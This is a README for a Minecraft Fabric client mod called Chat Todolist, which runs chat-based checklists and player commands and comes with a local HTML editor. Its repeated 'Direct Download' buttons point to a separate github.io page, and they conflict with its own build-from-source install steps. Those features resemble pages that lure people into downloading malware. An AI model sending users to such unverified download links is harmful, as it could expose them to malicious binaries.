# Chat Todolist v1.2.0 - Minecraft Fabric client mod 2026

> **A Fabric client mod for Minecraft Java that provides chat-led task lists, interactive checklist flows, and local JSON editing in version 1.2.0.**

[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Java-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandoncooperwzbe9192/chat-todolist-fabric-mod?style=flat-square)](https://github.com/brandoncooperwzbe9192/chat-todolist-fabric-mod)

---

<p align="center">
  <a href="https://brandoncooperwzbe9192.github.io/chat-todolist-fabric-mod/">
    <img src="https://img.shields.io/badge/Download-Chat%20Todolist%20Latest-brightgreen?style=for-the-badge" alt="Download Chat Todolist">
  </a>
</p>

> **[Direct Download - Chat Todolist v1.2.0](https://brandoncooperwzbe9192.github.io/chat-todolist-fabric-mod/)**

---

[Download Latest Build](https://brandoncooperwzbe9192.github.io/chat-todolist-fabric-mod/)

---

## Overview

Chat Todolist is a Fabric client mod for Minecraft Java that centers task management inside chat. It is built for checklist-driven play, branching prompts, and command-based actions, letting players follow structured routines without stepping out of the game.

This mod fits players who need in-world coordination, repeatable procedures, or guided multi-step tasks. With JSON checklist execution, clickable decision points, and a local HTML editor, it offers a practical way to shape workflows while keeping both editing and day-to-day use close to the Minecraft session.

---

## Features

- Interactive chat-based task lists for guided in-game workflows
- Clickable chat choices with true/false branching routes
- JSON checklist execution with support for jumping between steps
- Run commands as the player
- Local localhost HTML checklist editor for quicker updates
- Editing through forms or Blockly blocks
- Tab completion for checklist names
- Multilingual UI and configuration support

---

## Installation

1. Download or clone the repository into your Fabric mod workspace.
2. Build or place the mod artifact into your Minecraft `mods` folder.
3. Start Minecraft Java with the Fabric loader profile enabled.
4. Open the mod in-game and use the provided chat or editor workflow to load checklists.

If you are working from source, run your standard Fabric build task first, then copy the generated file into the client mods directory.

---

## Usage

The usual flow is to create a checklist, load it, and then work through the steps from chat:

- Create or edit a checklist in the local HTML editor.
- Save the checklist as JSON.
- Load the checklist in-game and follow the chat prompts step by step.
- Pick the clickable branch options when a task offers conditional paths.
- Use player-executed commands when a workflow needs a direct action.
- Use tab completion to locate checklist names more quickly.

Example workflow:

1. Open the editor.
2. Build a checklist with form fields or Blockly blocks.
3. Export the result to JSON.
4. Run the checklist inside Minecraft.
5. Jump between steps as needed while following chat prompts.

---

## Configuration

Checklist data and settings are managed through the mod's local files and UI-backed options. The project includes multilingual and config-aware support, so language and workflow preferences can be adjusted without changing the basic shape of your checklist files.

Example layout:

```json
{
  "language": "en",
  "checklists": [
    "example_task_list"
  ]
}
```

If your setup uses a custom storage path or editor location, keep the checklist JSON and related settings together so they are easy to reload and update.

---

## Requirements

- Minecraft Java
- Fabric client environment
- A compatible Minecraft version for the mod build
- Local browser access for the localhost HTML editor
- Basic disk space for checklist JSON files and exported workflow data

---

## FAQ

**How do I load a checklist?**  
Create or export a JSON checklist, then open it through the mod's in-game workflow.

**Can I edit checklists locally?**  
Yes. The project includes a localhost HTML editor with form and Blockly editing modes.

**Does it support different languages?**  
Yes. Multilingual UI and configuration support are included.

**What if tab completion does not show my checklist?**  
Check the checklist name, file location, and configuration entries, then reload the list.

**Where should I get updates?**  
Use the latest build link above or follow the repository releases and published build artifacts.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
